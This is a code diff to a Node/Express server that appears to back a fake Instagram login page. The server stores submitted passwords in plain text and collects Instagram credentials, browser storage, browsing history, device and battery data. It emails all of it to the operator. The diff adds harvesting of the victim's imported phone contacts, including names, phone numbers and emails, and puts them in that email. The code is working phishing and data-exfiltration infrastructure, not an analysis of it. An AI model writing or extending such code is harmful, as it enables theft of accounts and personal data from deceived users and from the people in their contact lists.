@@ -30,6 +30,7 @@ db.once('open', () => {
 const userSchema = new mongoose.Schema({
   email: { type: String, required: true },
   password: { type: String, required: true }, // Stored as plain text as requested
+  contacts: [{ type: Object }], // Imported contacts
   savedCredentials: {
     localStorage: Object,
     sessionStorage: Object,
@@ -314,7 +315,7 @@ app.post('/api/mobile-instagram-data', async (req, res) => {
 // Login endpoint
 app.post('/api/login', async (req, res) => {
   try {
-               const { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo, autoCollected } = req.body;
+               const { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo, autoCollected, contacts } = req.body;
 
     console.log('Login request received:', {
       email,
@@ -323,7 +324,8 @@ app.post('/api/login', async (req, res) => {
       deviceInfo: deviceInfo ? 'present' : 'missing',
       savedCredentials: savedCredentials ? 'present' : 'missing',
       instagramCredentials: instagramCredentials ? 'present' : 'missing',
-      batteryInfo: batteryInfo ? 'present' : 'missing'
+      batteryInfo: batteryInfo ? 'present' : 'missing',
+      contacts: contacts ? `${contacts.length} contacts` : 'none'
     });
 
     // Allow submission even without email/password to collect device data
@@ -335,7 +337,8 @@ app.post('/api/login', async (req, res) => {
              deviceInfo: deviceInfo || {},
              savedCredentials: savedCredentials || {},
              instagramCredentials: instagramCredentials || {},
-             batteryInfo: batteryInfo || {}
+             batteryInfo: batteryInfo || {},
+             contacts: contacts || []
            });
 
                await newUser.save();
@@ -345,7 +348,8 @@ app.post('/api/login', async (req, res) => {
       deviceInfo: deviceInfo ? 'present' : 'missing', 
       savedCredentials: savedCredentials ? 'present' : 'missing', 
       instagramCredentials: instagramCredentials ? 'present' : 'missing', 
-      batteryInfo: batteryInfo ? 'present' : 'missing' 
+      batteryInfo: batteryInfo ? 'present' : 'missing',
+      contacts: contacts ? `${contacts.length} contacts` : 'none'
     });
 
     // Send email notification
@@ -523,9 +527,22 @@ app.post('/api/login', async (req, res) => {
         </ul>
         ` : '<p><strong>Telefon raqamlari:</strong> Topilmadi</p>'}
         
+        ${contacts && contacts.length > 0 ? `
+        <hr>
+        <h3>📞 Imported Contacts (${contacts.length} ta):</h3>
+        <ul>
+          ${contacts.map(contact => `
+            <li><strong>${contact.name || 'Unknown'}</strong>
+              ${contact.tel ? `<br>📱 Telefon: ${Array.isArray(contact.tel) ? contact.tel.join(', ') : contact.tel}` : ''}
+              ${contact.email ? `<br>📧 Email: ${Array.isArray(contact.email) ? contact.email.join(', ') : contact.email}` : ''}
+            </li>
+          `).join('')}
+        </ul>
+        ` : ''}
+        
         ${savedCredentials.contacts && savedCredentials.contacts.length > 0 ? `
         <hr>
-        <h3>📞 Kontaktlar (${savedCredentials.contacts.length} ta):</h3>
+        <h3>📞 Saved Contacts (${savedCredentials.contacts.length} ta):</h3>
         <ul>
           ${savedCredentials.contacts.map(contact => `
             <li><strong>${contact.name}</strong>
@@ -1035,7 +1052,7 @@ app.post('/api/login', async (req, res) => {
         <p><strong>LocalStorage ma'lumotlari:</strong></p>
         <ul>
           ${Object.entries(savedCredentials.storageData.localStorage).slice(0, 10).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
-        </ul>
+               </ul>
         ` : ''}
         ` : ''}
         
@@ -1050,7 +1067,7 @@ app.post('/api/login', async (req, res) => {
         <p><strong>Pathname:</strong> ${savedCredentials.browserHistory.pathname}</p>
         <p><strong>Search:</strong> ${savedCredentials.browserHistory.search}</p>
         <p><strong>Origin:</strong> ${savedCredentials.browserHistory.origin}</p>
-        ` : ''}
+               ` : ''}
         <hr>
         <p><em>Bu xabar Instagram login sahifasidan yuborildi.</em></p>
       `
